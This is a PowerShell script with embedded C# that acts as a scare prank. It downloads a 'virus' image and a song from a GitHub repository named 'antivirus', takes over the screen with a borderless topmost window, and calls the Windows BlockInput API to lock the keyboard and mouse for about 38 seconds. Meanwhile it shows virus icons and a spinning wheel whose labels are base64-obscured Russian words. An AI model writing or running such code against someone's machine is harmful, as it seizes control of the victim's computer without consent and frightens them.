Add-Type -AssemblyName System.Windows.Forms,System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class GamePanel : Panel {
    public GamePanel() {
        this.DoubleBuffered = true;
        this.SetStyle(
            ControlStyles.AllPaintingInWmPaint |
            ControlStyles.UserPaint |
            ControlStyles.OptimizedDoubleBuffer,
            true);
    }
}

public class MCI {
    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    public static extern int mciSendString(string c, System.Text.StringBuilder r, int l, IntPtr h);
    public static void Play(string p) {
        mciSendString("open \"" + p + "\" type mpegvideo alias snd", null, 0, IntPtr.Zero);
        mciSendString("play snd", null, 0, IntPtr.Zero);
    }
    public static void Stop() {
        mciSendString("stop snd", null, 0, IntPtr.Zero);
        mciSendString("close snd", null, 0, IntPtr.Zero);
    }
}

public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool block);
    public static void Block()   { BlockInput(true);  }
    public static void Unblock() { BlockInput(false); }
}

public class VirusOrbit {
    public List<PictureBox> Viruses = new List<PictureBox>();
    public List<double> Angle  = new List<double>();
    public List<double> Speed  = new List<double>();
    public List<double> OrbitX = new List<double>();
    public List<double> OrbitY = new List<double>();
    public List<double> CX     = new List<double>();
    public List<double> CY     = new List<double>();

    public void Add(PictureBox pb, double angle, double speed, double ox, double oy, double cx, double cy) {
        Viruses.Add(pb); Angle.Add(angle); Speed.Add(speed);
        OrbitX.Add(ox); OrbitY.Add(oy); CX.Add(cx); CY.Add(cy);
    }

    public void MoveAll() {
        for (int i = 0; i < Viruses.Count; i++) {
            Angle[i] += Speed[i];
            int nx = (int)(CX[i] + Math.Cos(Angle[i]) * OrbitX[i]) - Viruses[i].Width  / 2;
            int ny = (int)(CY[i] + Math.Sin(Angle[i]) * OrbitY[i]) - Viruses[i].Height / 2;
            Viruses[i].Left = nx;
            Viruses[i].Top  = ny;
        }
    }
}
"@ -ReferencedAssemblies System.Windows.Forms,System.Drawing

# ── Загрузка ресурсов ──────────────────────────────────────────────────────────
$script:imgPath  = "$env:TEMP\virus_img.png"
$script:songPath = "$env:TEMP\vashsin_snd.mp3"

try {
    iwr "https://raw.githubusercontent.com/sweetvata/antivirus/main/virus.png" `
        -OutFile $script:imgPath -UseBasicParsing -ErrorAction Stop
} catch {
    [System.Windows.Forms.MessageBox]::Show("Не удалось скачать virus.png: $_","Ошибка",
        [System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    exit 1
}

try {
    iwr "https://raw.githubusercontent.com/sweetvata/antivirus/main/vashsin.mp3" `
        -OutFile $script:songPath -UseBasicParsing -ErrorAction Stop
} catch {
    [System.Windows.Forms.MessageBox]::Show("Не удалось скачать vashsin.mp3: $_","Ошибка",
        [System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    exit 1
}

$script:virusImg = [System.Drawing.Image]::FromFile($script:imgPath)
[MCI]::Play($script:songPath)

# ── Конфигурация колеса ────────────────────────────────────────────────────────
$script:REST  = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0KDQldCh0KI='))
$script:NREST = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0J3QldCg0JXQodCi'))

$script:lbl = @(
    $script:REST,$script:REST,$script:REST,$script:REST,$script:NREST,
    $script:REST,$script:REST,$script:REST,$script:REST,$script:NREST
)
$script:clr = @(
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(220,50,50),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(200,40,40)
)
$script:N     = 10
$script:sweep = 36.0
$script:a     = 0.0
$script:ticks = 0
$script:stopped = $false
$script:result  = ''

# ── Змейка: позиции для спавна ────────────────────────────────────────────────
$script:snakeStep = 80      # размер вируса-плитки
$script:snakeIdx  = 0       # текущая позиция в сетке
$script:snakePositions = [System.Collections.Generic.List[System.Drawing.Point]]::new()

$rng = New-Object System.Random
$script:vm = New-Object VirusOrbit

# ── Форма ──────────────────────────────────────────────────────────────────────
$script:form = New-Object System.Windows.Forms.Form
$script:form.WindowState     = 'Maximized'
$script:form.FormBorderStyle = 'None'
$script:form.TopMost         = $true
$script:form.BackColor       = 'Black'

$script:panel = New-Object GamePanel
$script:panel.Dock      = 'Fill'
$script:panel.BackColor = 'Black'
$script:form.Controls.Add($script:panel)

# ── Функция: построить сетку змейки под размер экрана ─────────────────────────
function Build-SnakeGrid {
    $W = $script:panel.Width; $H = $script:panel.Height
    $step = $script:snakeStep
    $cols = [int]([Math]::Ceiling($W / $step))
    $rows = [int]([Math]::Ceiling($H / $step))
    $script:snakePositions.Clear()
    for ($row = 0; $row -lt $rows; $row++) {
        if ($row % 2 -eq 0) {
            for ($col = 0; $col -lt $cols; $col++) {
                $script:snakePositions.Add([System.Drawing.Point]::new($col*$step, $row*$step))
            }
        } else {
            for ($col = ($cols-1); $col -ge 0; $col--) {
                $script:snakePositions.Add([System.Drawing.Point]::new($col*$step, $row*$step))
            }
        }
    }
}

# ── Paint: фон + змейка-вирусы (через GDI, без PictureBox) + колесо ──────────
$script:panel.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode     = 'AntiAlias'
    $g.TextRenderingHint = 'AntiAlias'
    $W = $script:panel.Width; $H = $script:panel.Height

    # Чёрный фон
    $g.Clear([System.Drawing.Color]::Black)

    # Рисуем все уже появившиеся вирусы-плитки змейки
    $step = $script:snakeStep
    $count = $script:snakeIdx
    if ($count -gt $script:snakePositions.Count) { $count = $script:snakePositions.Count }
    for ($i = 0; $i -lt $count; $i++) {
        $pt = $script:snakePositions[$i]
        $g.DrawImage($script:virusImg, $pt.X, $pt.Y, $step, $step)
    }

    # ── Колесо поверх ─────────────────────────────────────────────────────────
    $r  = [int]([Math]::Min($W,$H) * 0.26)
    $cx = [int]($W/2); $cy = [int]($H/2)
    $x  = $cx-$r; $y = $cy-$r; $d = $r*2

    $sh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(130,0,0,0))
    $g.FillEllipse($sh,$x+8,$y+8,$d,$d); $sh.Dispose()

    for ($n=0; $n -lt $script:N; $n++) {
        $br = New-Object System.Drawing.SolidBrush($script:clr[$n])
        $g.FillPie($br,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
        $br.Dispose()
    }

    $wp = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2)
    for ($n=0; $n -lt $script:N; $n++) {
        $g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
    }
    $wp.Dispose()

    $wp2 = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]5)
    $g.DrawEllipse($wp2,$x,$y,$d,$d); $wp2.Dispose()

    $fn = New-Object System.Drawing.Font('Arial',11,[System.Drawing.FontStyle]::Bold)
    $sf = New-Object System.Drawing.StringFormat
    $sf.Alignment = 'Center'; $sf.LineAlignment = 'Center'
    $tb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $ts = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0,0))
    for ($n=0; $n -lt $script:N; $n++) {
        $ma = ($script:a+$n*$script:sweep+$script:sweep/2)*[Math]::PI/180
        $tx = [float]($cx+[Math]::Cos($ma)*$r*0.68)
        $ty = [float]($cy+[Math]::Sin($ma)*$r*0.68)
        $g.DrawString($script:lbl[$n],$fn,$ts,$tx+1,$ty+1,$sf)
        $g.DrawString($script:lbl[$n],$fn,$tb,$tx,$ty,$sf)
    }
    $fn.Dispose(); $sf.Dispose(); $tb.Dispose(); $ts.Dispose()

    $cr = [int]($r*0.10)
    $cb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2); $cb.Dispose()

    $as = [float]($r*0.14)
    $pts = @(
        [System.Drawing.PointF]::new([float]$cx,           [float]($cy+$r-$as*0.5)),
        [System.Drawing.PointF]::new([float]($cx-$as*0.7), [float]($cy+$r+$as*0.8)),
        [System.Drawing.PointF]::new([float]($cx+$as*0.7), [float]($cy+$r+$as*0.8))
    )
    $ab = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255,220,0))
    $ap = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(180,140,0),[float]2)
    $g.FillPolygon($ab,$pts); $g.DrawPolygon($ap,$pts)
    $ab.Dispose(); $ap.Dispose()

    # Результат
    if ($script:stopped) {
        $rfn = New-Object System.Drawing.Font('Arial',120,[System.Drawing.FontStyle]::Bold)
        $rsf = New-Object System.Drawing.StringFormat
        $rsf.Alignment = 'Center'; $rsf.LineAlignment = 'Center'
        $rrc = New-Object System.Drawing.RectangleF(0,0,[float]$W,[float]$H)
        $rbg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(160,0,0,0))
        $g.FillRectangle($rbg,$rrc); $rbg.Dispose()
        $rtb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Yellow)
        $g.DrawString($script:result,$rfn,$rtb,$rrc,$rsf)
        $rfn.Dispose(); $rsf.Dispose(); $rtb.Dispose()
    }
})

# ── Функция: добавить мини-вирусы на орбиту ───────────────────────────────────
function Add-OrbitViruses($count, $speedMult) {
    $W = $script:panel.Width; $H = $script:panel.Height
    $cxF = [double]($W/2); $cyF = [double]($H/2)
    # ~8 оборотов за 18 сек при 16мс/тик
    $baseSpd = [double](8.0 * 2.0 * [Math]::PI / (18000.0/16.0))
    for ($i=0; $i -lt $count; $i++) {
        $sz = $rng.Next(45,75)
        $pb = New-Object System.Windows.Forms.PictureBox
        $pb.Width = $sz; $pb.Height = $sz
        $pb.SizeMode = 'StretchImage'
        $pb.Image = $script:virusImg
        $pb.BackColor = [System.Drawing.Color]::Transparent
        $script:panel.Controls.Add($pb)
        $ox  = [double]($rng.Next(120, [int]($W*0.46)))
        $oy  = [double]($rng.Next(90,  [int]($H*0.46)))
        $ang = [double]($rng.NextDouble() * 2 * [Math]::PI)
        $spd = [double]($baseSpd * $speedMult * (0.8 + $rng.NextDouble()*0.4))
        if ($rng.Next(2) -eq 0) { $spd = -$spd }
        $script:vm.Add($pb, $ang, $spd, $ox, $oy, $cxF, $cyF)
    }
}

# ── Главный таймер: змейка + колесо + орбиты ──────────────────────────────────
$t1 = New-Object System.Windows.Forms.Timer
$t1.Interval = 16
$t1.Add_Tick({
    $script:ticks++
    $ms = $script:ticks * 16

    # Змейка: новый вирус каждые ~160мс (каждые 10 тиков)
    if ($ms -le 20000 -and ($script:ticks % 10) -eq 0) {
        if ($script:snakeIdx -lt $script:snakePositions.Count) {
            $script:snakeIdx++
        }
    }

    # Орбиты мини-вирусов
    if ($script:vm.Viruses.Count -gt 0) {
        $script:vm.MoveAll()
    }

    # Колесо крутится 20 сек, потом тормозит
    if (-not $script:stopped) {
        if ($ms -lt 10000) {
            $script:a = ($script:a + 12) % 360
        } elseif ($ms -lt 20000) {
            $prog = ($ms - 10000) / 10000.0
            $script:a = ($script:a + (12*(1-$prog) + 0.5*$prog)) % 360
        }
    }

    $script:panel.Invalidate()
})

# ── tStop: результат + мини-вирусы ────────────────────────────────────────────
$tStop = New-Object System.Windows.Forms.Timer
$tStop.Interval = 20000
$tStop.Add_Tick({
    $tStop.Stop()
    $script:stopped = $true
    $norm = ((90 - $script:a) % 360 + 360) % 360
    $idx  = [int]([Math]::Floor($norm / $script:sweep)) % $script:N
    $script:result = $script:lbl[$idx]
    # 50 мини-вирусов с бешеной скоростью (×5)
    Add-OrbitViruses 50 5.0
})

# ── tClose: завершение ─────────────────────────────────────────────────────────
$tClose = New-Object System.Windows.Forms.Timer
$tClose.Interval = 38000
$tClose.Add_Tick({
    $t1.Stop(); $tStop.Stop(); $tClose.Stop()
    [InputBlocker]::Unblock()
    [MCI]::Stop()
    $script:form.Close()
})

# ── Запуск ─────────────────────────────────────────────────────────────────────
$script:form.Add_Shown({
    [InputBlocker]::Block()
    Build-SnakeGrid
    $t1.Start()
    $tStop.Start()
    $tClose.Start()
})

[void]$script:form.ShowDialog()
